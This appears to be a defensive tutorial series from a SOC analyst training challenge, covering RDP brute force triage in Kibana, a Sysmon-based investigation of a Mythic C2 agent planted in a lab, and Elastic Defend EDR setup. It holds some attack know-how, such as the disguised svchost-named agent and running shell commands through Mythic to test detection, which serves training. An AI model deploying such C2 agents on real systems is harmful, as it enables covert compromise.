- Triage an RDP brute force alert in Kibana
- Apply the 4-question investigation framework to RDP attacks
- Use Windows Event IDs to identify failed and successful RDP logins
- Trace post-authentication activity using Logon IDs
- Check the attacker's IP reputation with AbuseIPDB and GreyNoise
- Configure the RDP brute force Elastic rule to auto-create osTicket tickets

> 💡 **RDP vs SSH:** The investigation workflow is nearly identical to Day 26. The key differences are the log source (Windows Security Event Logs vs Linux auth.log), the event codes used (Windows Event IDs vs SSH event fields), and the target machine (Windows Server on port 3389 vs Linux server on port 22).

---

### 🛠️ Prerequisites

| Component | Purpose |
|-----------|---------|
| Elastic Stack (ELK) | SIEM — stores and queries logs |
| Kibana | Web UI for alert investigation |
| Elastic Agent on Windows Server | Forwards Windows Security Event logs |
| Sysmon (optional but recommended) | Additional process/network telemetry |
| RDP Brute Force detection rule | Created in a prior day of the challenge |
| osTicket with Webhook connector | Ticketing system (configured in Day 26) |
| AbuseIPDB / GreyNoise accounts | Free IP reputation lookups |

---

### 🔑 Key Windows Event IDs for RDP Investigation

Understanding these Event IDs is essential before diving into the investigation:

| Event ID | Meaning | Relevance |
|----------|---------|-----------|
| `4625` | Failed logon attempt | Core indicator of brute force activity |
| `4624` | Successful logon | Confirms whether an attacker got in |
| `4634` | Logoff / session end | Used to determine session duration |
| `4648` | Logon using explicit credentials | Can indicate lateral movement |

> RDP logons that succeed show `event.code: 4624` with `winlog.event_data.LogonType: 10` (RemoteInteractive). Always filter on Logon Type 10 to isolate true RDP sessions from other logon types.

---

### 🔍 Part 1 — Investigating the RDP Brute Force Alert

#### Step 1: Navigate to Alerts in Kibana

1. Log in to your **Kibana** web interface.
2. Click the **hamburger menu (☰)** in the top-left corner.
3. Under the **Security** section, click **Alerts**.
4. Filter the alert list to find alerts triggered by your RDP rule (e.g., `MyDFIR-RDP-Brute-Force-Attempt`).

You may see significantly more RDP alerts than SSH alerts — RDP is one of the most heavily scanned services on the internet and will attract real-world brute force traffic almost immediately after being exposed.

---

#### Step 2: Expand an Alert and Identify Key Fields

Click on one of the RDP brute force alerts to expand its details. Note the following fields:

| Field | Description |
|-------|-------------|
| `source.ip` | The attacker's IP address |
| `user.name` | The account targeted (e.g., `Administrator`) |
| `event.code` | Windows Event ID (look for `4625` = failed logon) |
| `winlog.event_data.LogonType` | Should be `3` (network) or `10` (RDP/RemoteInteractive) |
| `host.name` | The targeted Windows server |
| `event.count` | How many failed attempts in the detection window |

> **Example:** Source IP `91.238.181.8` made repeated failed logon attempts against the `Administrator` account on your Windows server.

---

#### Step 3: Apply the 4-Question Investigation Framework

Use this same framework from Day 26, now applied to RDP-specific data.

---

##### ❓ Question 1 — Is this IP known for brute force activity?

**Tool 1: [AbuseIPDB](https://www.abuseipdb.com)**
1. Copy the `source.ip` from the alert.
2. Search it on AbuseIPDB.
3. Review:
   - **Abuse Confidence Score** — how likely this IP is malicious
   - **Report categories** — look for "Brute-Force" or "Hacking" tags
   - **Total reports** — high counts indicate repeat offenders

**Tool 2: [GreyNoise](https://viz.greynoise.io)**
1. Search the same IP.
2. Look for tags such as:
   - `RDP Bruteforcer`
   - `RDP Scanner`
3. Classification will be **Malicious**, **Benign**, or **Unknown**.

> **Note for lab/on-prem environments:** If you're running an isolated lab where the attacker machine is on a private IP range, AbuseIPDB and GreyNoise won't return results for RFC 1918 addresses (e.g., `192.168.x.x`, `10.x.x.x`). In a real production environment, always run this check — it's a quick and high-value enrichment step.

> **Example finding:** IP `91.238.181.8` was found on AbuseIPDB with reports linked to RDP brute force attacks. Even at 26% abuse confidence, the report category context confirms this is attack traffic.

---

##### ❓ Question 2 — Were any other user accounts targeted by this IP?

Search Kibana for all failed logon events from the attacker's IP to see the full scope of targeted accounts:

```kql
source.ip : "<attacker-IP>" and event.code : "4625"
```

Add `user.name` to your selected columns to see which accounts were attempted. Common RDP targets include:
- `Administrator`
- `admin`
- `user`
- `guest`
- Custom usernames from breach wordlists

> If the attacker only targeted `Administrator`, it may be an automated scanner. If a long and specific username list is observed, it could suggest a more targeted attack.

---

##### ❓ Question 3 — Were any login attempts successful?

Search for successful RDP logons from the attacker's IP using Windows Event ID `4624`:

```kql
source.ip : "<attacker-IP>" and event.code : "4624"
```

To specifically isolate RDP sessions, add the Logon Type filter:

```kql
source.ip : "<attacker-IP>" and event.code : "4624" and winlog.event_data.LogonType : "10"
```

- **No results** → The brute force failed. Document findings and close/downgrade the alert.
- **Results found** → A successful RDP login occurred. Proceed immediately to Question 4.

---

##### ❓ Question 4 — If successful, what happened after the login?

This is the most critical part of the investigation. If you find a successful logon:

**Step 4a: Record the Logon Session Details**

From the `4624` event, note:
- **Timestamp** (date, time, and timezone — always use UTC)
- **`host.name`** — the compromised Windows server
- **`winlog.event_data.TargetUserName`** — the account that was logged into
- **`winlog.event_data.LogonId`** — the session ID (a hex value like `0x3E7`). This is your anchor for tracing all activity within this session.

**Step 4b: Trace the Session Using the Logon ID**

Query all events associated with this specific logon session:

```kql
winlog.event_data.LogonId : "<logon-id-hex>" and host.name : "<hostname>"
```

Review the events in chronological order. Look for:
- **Process creation events** (Sysmon Event ID 1 / Windows Event ID 4688) — what programs were launched?
- **File creation or modification** — were any scripts or tools dropped?
- **Registry modifications** — persistence mechanisms?
- **Network connections** — outbound C2 traffic?
- **Privilege escalation** — was the session used to add users or modify groups?

**Step 4c: Determine Session Duration**

Find the `4634` (logoff) event with the matching Logon ID to determine how long the session lasted:

```kql
event.code : "4634" and winlog.event_data.LogonId : "<logon-id-hex>"
```

> A very short session (seconds) may indicate an automated script or credential validation. A longer session (minutes to hours) suggests hands-on-keyboard activity and warrants a full incident response.

**Step 4d: Check for New Logon IDs**

During a session, Windows may generate new Logon IDs for spawned processes or privilege changes. Look at the latest logs in your session trace and check if new Logon IDs appear — query those as well to ensure full coverage.

> 🚨 **A confirmed successful RDP brute force is a security incident.** Escalate per your organization's incident response process, consider isolating the host, and reset the compromised account credentials immediately.

---

### 🔄 RDP vs SSH — Key Investigation Differences

| Aspect | SSH (Day 26) | RDP (Day 27) |
|--------|-------------|-------------|
| Target OS | Linux | Windows |
| Default Port | 22 | 3389 |
| Log Source | `/var/log/auth.log` | Windows Security Event Log |
| Failed Login Field | `system.auth.ssh.event: Failed` | `event.code: 4625` |
| Successful Login Field | `event.outcome: success` | `event.code: 4624` |
| Session Tracking | SSH session ID | Windows Logon ID (hex) |
| Logon Type Filter | N/A | `LogonType: 10` for RDP |
| Post-auth visibility | Shell commands, process spawns | Windows Event IDs + Sysmon |

---

### 🎫 Part 2 — Configuring osTicket for RDP Alerts

If you completed the osTicket webhook setup in Day 26 for SSH alerts, the RDP configuration follows the exact same process — you're simply applying it to a different rule.

#### Step 1: Edit the RDP Brute Force Detection Rule

1. In Kibana, go to:  
   **Security → Rules → Detection Rules (SIEM)**

2. Find your RDP Brute Force rule (e.g., `MyDFIR-RDP-Brute-Force-Attempt`).

3. Click **Edit rule settings**.

4. Go to the **Actions** tab.

5. Set **Action frequency** to: `Per rule run`

---

#### Step 2: Add the osTicket Webhook Action

1. Select your **osTicket Webhook connector** from the dropdown.

2. In the **Body** field, use the same XML payload template as your SSH rule:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ticket alert="true" autorespond="true" source="API">
  <n>Elastic</n>
  <email>api@osticket.com</email>
  <subject>{{rule.name}}</subject>
  <phone>318-555-8634X123</phone>
  <message type="text/plain"><![CDATA[
    Please investigate the alert generated by {{rule.name}}.
    ---
    Description: {{rule.description}}
    ---
    Link: {{rule.url}}
  ]]></message>
</ticket>
```

3. Click **Save changes**.

---

#### Step 3: Verify Tickets Are Being Created

1. Trigger or wait for a new RDP brute force event.
2. Open your **osTicket** interface and confirm a new ticket was generated automatically.
3. Assign the ticket to yourself or a team member.
4. Work through the 4-question framework, document your findings in the ticket reply, and close or escalate accordingly.

> All tickets — open and closed — are stored in osTicket and serve as your **audit trail** for every alert investigated.

---

### ✅ Summary of Key Takeaways

| Topic | Key Point |
|-------|-----------|
| Alert triage | Filter Kibana Security Alerts by your RDP rule name |
| Critical Event IDs | `4625` = failed logon, `4624` = success, `4634` = logoff |
| IP enrichment | Use AbuseIPDB + GreyNoise for all external IPs |
| Scope check | Query `event.code: 4625` by attacker IP to see all targeted users |
| Success detection | Query `event.code: 4624` + `LogonType: 10` for RDP sessions |
| Session tracing | Use the Logon ID (hex) to pivot across all events in a session |
| Automation | Apply the same osTicket webhook action to the RDP rule |
| Protocol parity | The 4-question framework works the same for SSH and RDP |

---
> *Part of the MyDFIR 30-Day SOC Analyst Challenge. This tutorial is based on Day 27 content and is intended for educational purposes.*

## Day 28 — Investigating a Mythic C2 Agent

### 📋 Summary

This is the most advanced investigation in the challenge so far. Day 28 shifts from reactive alert triage (brute force) to a **deeper post-compromise investigation** — analyzing telemetry from a **Mythic C2 (Command and Control) agent** that was planted on your Windows server during the attack simulation in Day 20.

You'll learn how to detect a C2 agent both when you know its name and when you don't, how to reconstruct a full attack timeline using **Sysmon telemetry and Process GUIDs**, and how to create a new detection rule that alerts on C2-driven shell activity. Finally, you'll wire the Mythic C2 alert into osTicket for automated ticket generation.

**What you'll learn:**
- What C2 frameworks are and how Mythic works
- How to find a C2 agent in Kibana when you know its name
- How to hunt for C2 activity without prior knowledge using dashboards and network telemetry
- How to use **Sysmon Event IDs 1, 3, 11, and 29** to build an attack timeline
- How to pivot through events using **Process GUIDs** and **Parent Process GUIDs**
- How to extract and use file hashes for further threat intelligence lookups
- How to create a custom Elastic detection rule for C2 shell command activity
- How to configure **Custom Highlighted Fields** in Elastic alert rules
- How to integrate the Mythic C2 alert with osTicket

---

### 🛠️ Prerequisites

| Component | Purpose |
|-----------|---------|
| Elastic Stack (ELK) | SIEM — stores and queries Sysmon + Windows logs |
| Kibana | Web UI for investigation and rule management |
| Sysmon on Windows Server | Critical — provides process, file, and network telemetry |
| Mythic C2 server (from Day 20) | The C2 infrastructure used to generate telemetry |
| Apollo agent (or equivalent) | The C2 agent that beaconed from your Windows server |
| Suspicious Activity dashboard | Built in a prior day; used for threat hunting |
| osTicket Webhook connector | Already configured in Days 26–27 |

> ⚠️ **Sysmon is essential for this investigation.** Without it, you will not have process creation (Event ID 1), network connection (Event ID 3), file creation (Event ID 11), or file hash (Event ID 29) events. If Sysmon is not generating logs in your Elastic instance, revisit your agent configuration before proceeding.

---

### 🧠 Background: What Is a C2 Framework?

A **Command and Control (C2) framework** is a tool used by attackers to remotely control compromised machines after gaining initial access. The compromised machine runs a lightweight **agent** that periodically calls back ("beacons") to the attacker's C2 server to receive instructions.

**Mythic** is an open-source C2 framework commonly used in red team simulations and security research. In this challenge, the **Apollo agent** was used as the payload — a Windows-compatible agent configured to communicate with the Mythic server over HTTP (port 80) or TCP (port 9999).

**Common C2 behaviors that generate detectable telemetry:**

| Behavior | Sysmon Event | What It Looks Like |
|---------|-------------|-------------------|
| Agent executable created on disk | Event ID 11 (File Create) | `.exe` dropped in `C:\Users\Public\Downloads` |
| Agent process starts | Event ID 1 (Process Create) | Unusual process spawned by PowerShell |
| Agent beacons to C2 server | Event ID 3 (Network Connection) | Outbound connection to external IP on port 80/443/9999 |
| File hash logged | Event ID 29 (File Executable Detected) | SHA1/SHA256 of the agent on disk |
| Shell commands executed via C2 | Event ID 1 (Process Create) | `cmd.exe` spawned as a child of the agent |

---

### 🔍 Part 1 — Investigating When You Know the Agent Name

In a lab setting, you may already know the name of the malicious executable from a prior alert or incident report. Use it as your starting point.

#### Step 1: Search for the Agent in Kibana

1. Log in to Kibana and go to **Analytics → Discover** (or use the search bar in the Security section).
2. Search for the known agent filename:

```kql
process.name : "svchost-yourname.exe"
```

> Replace `svchost-yourname.exe` with the actual name of your Mythic agent. In this challenge, participants typically name it something like `svchost-[username].exe` to keep it distinct.

3. **Sort events from oldest to newest** — this is critical. Starting from the first event lets you trace the attack chain forward in time rather than backwards.

4. Note the key fields in each result:
   - `@timestamp` — when the event occurred
   - `winlog.event_data.UtcTime` — the actual time recorded on the endpoint (important — this may differ from Elastic ingestion time)
   - `process.pid` — the process ID
   - `winlog.event_data.ProcessGuid` — the globally unique process identifier (your primary pivot point)
   - `winlog.event_data.ParentProcessGuid` — what spawned this process

> 💡 **Log ingestion delay is real.** Elastic does not always receive events in the exact order they occurred. Always compare `winlog.event_data.UtcTime` (the endpoint timestamp) against `@timestamp` (the ingestion time) to establish the true sequence of events.

---

### 🔍 Part 2 — Hunting for C2 When You Don't Know the Agent Name

In real-world investigations, you won't always know the agent's filename in advance. Here are two effective methods to discover it.

#### Method A: Suspicious Activity Dashboard

1. In Kibana, open the **Suspicious Activity dashboard** you built in a prior day.
2. Change the time range to the last **30 days** to capture all historical activity.
3. Look at the **"Process Initiated Network Connections"** table.

**Red flags to look for:**
- An executable running from an unusual path like `C:\Users\Public\Downloads\` — legitimate applications almost never run from here
- Multiple processes all connecting to the **same destination IP** — a strong indicator of C2 beaconing
- Outbound connections on port **80 (HTTP)** or **443 (HTTPS)** from a process that has no business making web connections (e.g., a random `.exe` in Downloads)
- PowerShell making outbound network connections

Once you identify a suspicious process and destination IP, use those as your investigation starting points.

---

#### Method B: Network Telemetry Query

Search directly for outbound network connections (Sysmon Event ID 3) and look for unusual destinations:

```kql
event.code : "3" and not winlog.event_data.DestinationIp : ("127.0.0.1" OR "::1")
```

Add `winlog.event_data.DestinationIp`, `process.name`, and `process.executable` as visible columns. Sort by destination IP to group connections to the same external address — repeated beaconing to a single IP is a hallmark of C2 traffic.

> 💡 **RITA (Real Intelligence Threat Analytics)** by Black Hills Information Security is a dedicated tool for detecting C2 beaconing in network logs. It identifies long-duration, periodic connections that are typical of C2 frameworks. While not used directly in this challenge, it's worth exploring for deeper network-based C2 detection.

---

### 🔍 Part 3 — Building the Attack Timeline with Process GUIDs

The **Process GUID** is the most powerful pivot point available in Sysmon telemetry. Unlike a PID (which can be reused by the OS), a Process GUID uniquely identifies a specific process instance across its entire lifetime.

#### Step 1: Find the First Suspicious Network Connection

Search for outbound connections to the C2 server's IP:

```kql
event.code : "3" and winlog.event_data.DestinationIp : "<C2-server-IP>"
```

1. Open the **earliest** event.
2. Copy the **`winlog.event_data.ProcessGuid`** value.
3. Note all timestamps from these network events — take note if multiple GUIDs appear (this indicates different processes made C2 connections).

---

#### Step 2: Pivot Using the Process GUID

Wrap the GUID in quotes and search all events for that specific process:

```kql
"<ProcessGuid-value>"
```

> Always wrap GUIDs in double quotes — without them, Elastic may parse the hyphens and return incomplete results.

Sort results **oldest to newest**. You should now see the full lifecycle of this process:

| Event | Sysmon ID | What It Shows |
|-------|-----------|---------------|
| PowerShell session opens | 1 | Parent process that initiated the download |
| Network connection (download) | 3 | File download from attacker's HTTP server |
| File creation | 11 | Agent `.exe` written to `C:\Users\Public\Downloads\` |
| Executable file detected | 29 | SHA1/SHA256 hash of the agent recorded |
| Process creation (agent starts) | 1 | Agent `.exe` launched — **ProcessGuid becomes ParentProcessGuid** |
| Network connection (beacon) | 3 | Agent calls back to C2 on port 80 |
| Child process creation (shell cmds) | 1 | `cmd.exe` spawned for each `shell <command>` run via C2 |

---

#### Step 3: Pivot to the Agent's Own Process GUID

Once the agent starts, its **ProcessGuid becomes the ParentProcessGuid** for everything it spawns. Search for the agent's new GUID to trace its post-execution activity:

```kql
"<Agent-ProcessGuid>"
```

Here you'll find:
- The outbound HTTP beacon connections the agent makes
- Every `cmd.exe` child process spawned when the attacker runs `shell <command>` through the C2

> **Why are C2 shell commands distinct?** When an attacker uses the `shell <command>` option in Mythic, it spawns a **new `cmd.exe` process** for each command. Each command gets its own Process GUID as a child of the agent, making them individually traceable. Commands run natively within the C2 framework's internal functions (without using `shell`) are less likely to generate cmd.exe logs.

---

#### Step 4: Extract the File Hash

From the **Sysmon Event ID 29** (Executable File Detected) log, extract the file hash:

- `winlog.event_data.SHA1` — the SHA1 hash of the agent executable
- `winlog.event_data.SHA256` — the SHA256 hash (if available)

Use these hashes to look up the file on threat intelligence platforms:
- **[VirusTotal](https://www.virustotal.com)** — check if the hash is flagged by any AV engines
- **[MalwareBazaar](https://bazaar.abuse.ch)** — check if the sample is a known malware family

> In this lab scenario, your custom-compiled Mythic agent will likely show as "unknown" or "clean" on VirusTotal since it was freshly generated. In real incidents, checking file hashes is a quick way to confirm whether a file is known malware.

---

#### Step 5: Look for Evidence of Data Access

Search for file access events around the time of the compromise. In particular, look for sensitive files being opened:

```kql
process.name : "notepad.exe" OR file.name : "passwords*"
```

In the challenge simulation, an attacker commonly opens a `passwords.txt` file to simulate data exfiltration. Document any such findings — accessed file name, timestamp, and the process that opened it.

---

#### Step 6: Document Your Timeline

As you investigate, build a written timeline of events. Here's an example format:

```
[YYYY-MM-DD HH:MM:SS UTC] — Network connection from PowerShell to <C2-IP>:9999 (file download)
[YYYY-MM-DD HH:MM:SS UTC] — File created: C:\Users\Public\Downloads\svchost-[name].exe
[YYYY-MM-DD HH:MM:SS UTC] — Executable detected (SHA1: <hash>)
[YYYY-MM-DD HH:MM:SS UTC] — Process created: svchost-[name].exe (PID: XXXX)
[YYYY-MM-DD HH:MM:SS UTC] — Network connection from agent to <C2-IP>:80 (C2 beacon)
[YYYY-MM-DD HH:MM:SS UTC] — cmd.exe spawned: shell whoami
[YYYY-MM-DD HH:MM:SS UTC] — cmd.exe spawned: shell ipconfig
[YYYY-MM-DD HH:MM:SS UTC] — notepad.exe accessed: passwords.txt
```

A documented timeline like this is what you would include in an incident report or osTicket response.

---

### 🛡️ Part 4 — Creating a New Detection Rule for C2 Shell Activity

Beyond the existing Mythic agent detection rule, you can create a second, more targeted rule that fires whenever the C2 executes shell commands — even if the agent itself is not explicitly identified.

#### Step 1: Build the Query

The following query targets `cmd.exe` processes that were spawned by a non-system user (i.e., an interactive session, not a Windows service):

```kql
event.code : "1" and winlog.event_data.OriginalFileName : "Cmd.Exe" and not winlog.event_data.ParentUser : "NT AUTHORITY\\SYSTEM"
```

Verify the query returns the expected shell command events before creating the rule.

#### Step 2: Create the Detection Rule

1. In Kibana, go to **Security → Rules → Detection Rules (SIEM) → Create New Rule**.
2. Select **Custom Query** as the rule type.
3. Paste the query above.
4. Under **Required Fields**, add:
   - `winlog.event_data.CommandLine` — shows the actual command that was run
   - `winlog.event_data.ParentUser` — who spawned the cmd process
   - `winlog.event_data.ProcessGuid` — for pivoting
   - `host.name` — which machine it ran on
5. Set **Severity**: Medium
6. Set **Risk Score**: 60
7. Set the rule to run **every 1 minute**
8. Add a **Webhook Action** pointed at your osTicket connector with the same XML body used in Days 26–27.

#### Step 3: Add Custom Highlighted Fields

Custom Highlighted Fields make the most important context visible at the top of each alert without having to expand every field manually.

1. In the rule's **Edit rule settings**, go to the **About** tab.
2. Scroll to **Custom Highlighted Fields**.
3. Add the same fields you set as Required Fields:
   - `winlog.event_data.CommandLine`
   - `winlog.event_data.ParentUser`
   - `winlog.event_data.ProcessGuid`
   - `host.name`
4. Save the rule.

Now when an alert fires, those fields appear prominently at the top of the alert detail view.

#### Step 4: Test the Rule

1. Log in to your **Mythic server** and navigate to **Callbacks**.
2. Open your active agent session and run:
   ```
   shell whoami
   ```
3. Wait up to 60 seconds, then check **Security → Alerts** in Kibana for the new alert.
4. Confirm a ticket was also auto-created in osTicket.

---

### 🎫 Part 5 — Connecting the Existing Mythic C2 Rule to osTicket

If you haven't already wired your pre-existing Mythic detection rule (created in Day 20) to osTicket, do so now using the same process as Days 26–27:

1. Go to **Security → Rules → Detection Rules (SIEM)**.
2. Find your `MyDFIR-Mythic-C2-Apollo-Agent-Detected` rule.
3. Click **Edit rule settings → Actions**.
4. Select the **osTicket Webhook connector**.
5. Set the body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ticket alert="true" autorespond="true" source="API">
  <n>Elastic</n>
  <email>api@osticket.com</email>
  <subject>{{rule.name}}</subject>
  <phone>318-555-8634X123</phone>
  <message type="text/plain"><![CDATA[
    Please investigate the alert generated by {{rule.name}}.
    ---
    Description: {{rule.description}}
    ---
    Link: {{rule.url}}
    Alert ID: {{alert.id}}
  ]]></message>
</ticket>
```

6. Click **Save changes**.
7. Trigger the agent again to confirm a ticket is created in osTicket.

---

### ✅ Summary of Key Takeaways

| Topic | Key Point |
|-------|-----------|
| C2 detection (known agent) | Search by filename in Kibana, sort oldest to newest |
| C2 detection (unknown agent) | Use Suspicious Activity dashboard → Process Initiated Network Connections |
| Primary pivot point | `ProcessGuid` — uniquely identifies a process and all events it generated |
| Parent/child relationships | When the agent spawns cmd.exe, its GUID becomes the `ParentProcessGuid` |
| Log ingestion delay | Always compare `UtcTime` (endpoint) vs `@timestamp` (ingestion) for true sequence |
| File hash extraction | Sysmon Event ID 29 logs SHA1/SHA256 of executables — use with VirusTotal |
| Shell command detection | Query `event.code: "1"` for `Cmd.Exe` processes not spawned by SYSTEM |
| Custom Highlighted Fields | Surfaces critical alert context without manual field expansion |
| Timeline documentation | Build a timestamped (UTC) event log to include in your incident report/ticket |

---

### 🔑 Key Sysmon Event IDs Reference

| Event ID | Name | Use in This Investigation |
|----------|------|--------------------------|
| 1 | Process Create | Trace agent launch, PowerShell session, cmd.exe shell commands |
| 3 | Network Connection | Identify C2 beacon traffic and download connections |
| 11 | File Create | Confirm agent was written to disk |
| 29 | File Executable Detected | Extract SHA1/SHA256 hash of the agent |

> *Part of the MyDFIR 30-Day SOC Analyst Challenge. This tutorial is based on Day 28 content and is intended for educational purposes only. Mythic C2 and similar tools should only be used in authorized lab environments.*


## Day 29 — Setting Up Elastic Defend (EDR)

### 📋 Summary

Day 29 is the capstone of the challenge's defensive setup. Up until now, the ELK stack has been operating as a **detection and logging** platform — it watches and alerts, but does not actively stop threats. Today you add **Elastic Defend**, Elastic's native **Endpoint Detection and Response (EDR)** solution, which transforms your Windows server from a passive log source into an actively protected endpoint.

After installation, you'll test Elastic Defend by attempting to run your Mythic C2 agent — which the EDR will detect, quarantine, and block in real time. You'll then configure an **automated response action** that isolates the host whenever a malware alert fires, and verify that the isolation works end-to-end.

**What you'll learn:**
- What EDR is and how it differs from a SIEM
- How to install and configure Elastic Defend via Kibana Integrations
- The difference between EDR configuration types (Essential vs Complete)
- How to verify the EDR is active on your endpoint
- How Elastic Defend generates malware prevention telemetry
- How to read and interpret a Malware Prevention Alert in Kibana
- How to configure an **automated host isolation response action** on a detection rule
- How to verify automated isolation by re-attempting to download the C2 agent

---

### 🛠️ Prerequisites

| Component | Purpose |
|-----------|---------|
| Elastic Stack (ELK) on a cloud server | Running SIEM — must be operational |
| Kibana | Web UI for integration setup and alert review |
| Elastic Agent installed on Windows Server | Required — Elastic Defend deploys on top of it |
| Fleet Server | Manages agent policies centrally |
| Windows Server (agent enrolled in Fleet) | The endpoint Elastic Defend will protect |
| Mythic C2 agent binary | Used to trigger a real malware detection test |
| Mythic C2 server | Used to serve the agent binary for download |

> ⚠️ **Elastic Defend requires Elastic Agent.** It cannot be installed in standalone mode — your Windows Server must already be enrolled in Fleet. If your agent was unenrolled or is showing as inactive, re-enroll it before proceeding.

> 💡 **Free vs Trial/Paid tier:** With the free Elastic subscription, Elastic Defend installs and detects malware, but **remote host isolation is only available on the 30-day trial or paid tiers**. If you activated a trial in an earlier day of the challenge, you should have access to isolation. If you're on the free tier, you can still follow every step except the automated isolation test in Part 4.

---

### 🧠 Background: EDR vs SIEM — What's the Difference?

| | SIEM (Elastic Stack) | EDR (Elastic Defend) |
|---|---|---|
| **Primary function** | Collect, store, and correlate logs from many sources | Monitor, detect, and respond to threats on an endpoint |
| **Where it runs** | Centralized server | Directly on the endpoint (kernel-level) |
| **Response capability** | Alert and notify | Alert + actively block, quarantine, and isolate |
| **Data source** | Logs forwarded from agents | Deep endpoint telemetry (processes, memory, files, network) |
| **Detection method** | Rule-based queries on log data | Behavioral analysis, ML models, signature matching |

In this challenge, both work together: Elastic Defend **catches and stops** the threat at the endpoint, and the **SIEM surfaces the alert** in Kibana for analyst review.

**What EDR does for you:**
- Detects and blocks malware, ransomware, and fileless attacks in real time
- Provides a full process tree for every alert
- Enables one-click or automated host isolation to contain an incident
- Generates rich endpoint telemetry for threat hunting
- Adds file hash, quarantine path, and parent process context to every malware alert

---

### 🔧 Part 1 — Installing Elastic Defend

#### Step 1: Navigate to Integrations

1. Log in to **Kibana**.
2. Click the **hamburger menu (☰)** in the top-left corner.
3. Scroll down to the **Management** section.
4. Click **Integrations**.

---

#### Step 2: Find and Add Elastic Defend

1. In the Integrations search bar, type `Elastic Defend`.
2. Click on the **Elastic Defend** tile.
3. Click **Add Elastic Defend** in the top-right.

---

#### Step 3: Configure the Integration

You'll be presented with a configuration form. Fill it in as follows:

**Integration name:**
```
MyDFIR-EDR
```
> Name it something identifiable. If you have multiple endpoints, the name helps distinguish policies.

**Description (optional):**
```
Elastic Defend EDR for Windows Server endpoint protection
```

**Configuration type — Select environment:**
- Choose **Traditional Endpoints**
  > This covers standard desktops, laptops, and servers (VMs included). The alternative, "Cloud Workloads," is designed for Linux-based cloud infrastructure (containers, Kubernetes nodes).

**Protection preset — Select EDR level:**
- Choose **Complete EDR (Endpoint, Detection & Response)**
  > This unlocks the full telemetry suite and all protection features. "Essential EDR" provides a reduced feature set. Always select Complete EDR for a lab or production SOC environment.

> **Free tier note:** Complete EDR is available during the 30-day trial. On the free tier, you may only have access to Essential EDR features. The setup steps are identical — only the available capabilities differ.

---

#### Step 4: Attach to Your Windows Agent Policy

1. Under **"Where to add this integration"**, select **Existing hosts**.
2. From the policy dropdown, choose your **Windows Policy** (the one your Windows Server's Elastic Agent is enrolled in).
   > If you used Fleet Server during setup (recommended), all your agents are managed under named policies. Select the policy that includes your Windows Server.
3. Click **Save and continue**.
4. On the confirmation screen, click **Save and deploy changes**.

Elastic will push the Elastic Defend integration to your Windows Server automatically through Fleet. No manual installation on the Windows Server is required.

---

#### Step 5: Verify the Deployment

1. In Kibana, click the **hamburger menu (☰)**.
2. Under **Security**, click **Manage**.
3. Click **Endpoints**.

You should see your Windows Server listed as an active endpoint with:
- **Policy status:** Healthy
- **Agent status:** Online
- **Integration:** Elastic Defend

> If the endpoint does not appear within 2–3 minutes, check that the Elastic Agent service is running on the Windows Server (`services.msc` → look for `Elastic Agent`).

**Available Actions (Trial/Paid tier):**
Clicking the **Actions** dropdown next to your endpoint reveals:

| Action | What It Does |
|--------|-------------|
| Isolate host | Cuts the endpoint off from all network traffic except Elastic communication |
| Release host | Restores full network connectivity after isolation |
| Respond | Opens a live terminal-like console on the endpoint |
| Get processes | Returns the running process list |
| Suspend process | Pauses a specific running process |

---

### 🧪 Part 2 — Testing Elastic Defend: Malware Detection

Now that Elastic Defend is active, test it by attempting to run the Mythic C2 agent binary on the Windows Server. The EDR should detect and block it immediately.

#### Step 1: Attempt to Run the Mythic Agent

On your Windows Server:

1. Open **File Explorer** and navigate to the location of your Mythic agent binary (e.g., `C:\Users\Public\Downloads\svchost-[name].exe`).
2. Double-click the file to try to execute it.

**Expected result:** Windows will display a notification from Elastic Security stating the file was blocked, and the file will be quarantined automatically.

> If the original agent has already been quarantined from prior activity in Day 28, proceed to the download test in Part 4 instead, where you'll try downloading a fresh copy.

---

#### Step 2: Review the Malware Alert in Kibana — Discover

1. In Kibana, go to **Analytics → Discover**.
2. In the KQL search bar, type:
   ```kql
   malware
   ```
3. Press Enter. You should see **Malware Prevention Alert** entries at the top of the results.

4. Expand one of the malware log entries. Key fields to note:

| Field | What It Tells You |
|-------|------------------|
| `file.name` | Name of the quarantined file |
| `file.path` | Original location of the file on disk |
| `file.Ext.quarantine_path` | Where Elastic moved the file after quarantine |
| `file.hash.sha256` | Hash of the file — use with VirusTotal |
| `file.owner` | The user account that owned the file |
| `agent.type` | Should show `endpoint` (Elastic Defend) |
| `event.code` | Malware prevention event code |
| `event.action` | Action taken — e.g., `kill-process`, `quarantine` |
| `process.name` | The process that tried to execute the file |
| `process.parent.name` | What launched the malicious process |

---

#### Step 3: Review the Malware Alert in Kibana — Security Alerts

1. In Kibana, go to **Security → Alerts**.
2. Look for a **Malware Prevention Alert** — it will have a distinct orange or red severity badge.
3. Click to expand the alert.

What you'll see in the alert detail view:

- **Highlighted fields** — Elastic Defend automatically surfaces the most important context: username, process executable, file path, and file hash. Unlike custom SIEM rules where you had to configure Highlighted Fields manually (Day 28), Elastic Defend populates these automatically.
- **Process tree** — a visual representation of the parent → child process chain that led to the malicious execution. This is one of Elastic Defend's most valuable features for rapid triage.
- **Alert actions** — buttons to take immediate response actions directly from the alert detail view.

> **No investigation guide yet?** In a fresh lab environment, Elastic Defend's built-in investigation guides may not appear. In a production environment with Elastic's threat intelligence feeds active, investigation guides provide analyst runbooks directly inside the alert.

---

### ⚡ Part 3 — Configuring Automated Host Isolation

Rather than requiring an analyst to manually isolate a host after a malware alert, you can configure the detection rule to **automatically isolate the endpoint** the moment the alert fires. This is a core incident response automation capability.

> ⚠️ **Trial/Paid tier required.** Automated host isolation via Response Actions requires Elastic's trial or paid subscription. Free-tier users can configure the rule but the isolation action will not execute.

#### Step 1: Find the Malware Detection Rule

1. In Kibana, go to **Security → Rules → Detection Rules (SIEM)**.
2. Search for the Windows malware rule. It will be named something like:
   - `Malware Prevention Alert`
   - Or the specific rule that generated your alert (visible in the alert detail)
3. Click on the rule name to open it.
4. Click **Edit rule settings**.

---

#### Step 2: Add an Automated Response Action

1. In the rule settings, navigate to the **Response Actions** tab.
2. Click **Add response action**.
3. Select **Elastic Defend** from the list of available response action providers.
4. From the action dropdown, choose **Isolate host**.
5. Optionally add a comment:
   ```
   Automatically isolated due to malware detection by Elastic Defend.
   ```
6. Click **Save changes**.

The rule will now automatically trigger host isolation on any endpoint that generates a matching malware alert — no analyst intervention required.

---

### 🧪 Part 4 — Verifying Automated Isolation End-to-End

With the automated isolation response action configured, perform a live test to confirm the full detection → isolation chain works.

